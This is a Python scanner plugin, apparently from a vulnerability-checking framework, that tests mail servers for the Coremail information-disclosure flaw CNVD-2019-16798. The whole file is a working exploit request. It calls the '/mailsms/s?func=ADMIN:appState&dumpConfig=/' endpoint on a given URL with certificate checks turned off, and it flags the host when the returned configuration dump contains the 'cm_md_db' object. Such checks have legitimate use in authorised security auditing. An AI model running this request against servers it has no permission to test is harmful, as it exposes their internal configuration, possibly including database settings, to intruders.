#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/GNVxBw0XBIOoD8OnxpMXCA',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Coremail Information Disclosure CNVD-2019-16798',

      'level'     :   'medium',
      'FOFA'      :   '',
      'author'    :   'ppxfx',
      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/mailsms/s?func=ADMIN:appState&dumpConfig=/'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and r'<object name=\"cm_md_db\">' in res.text:
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret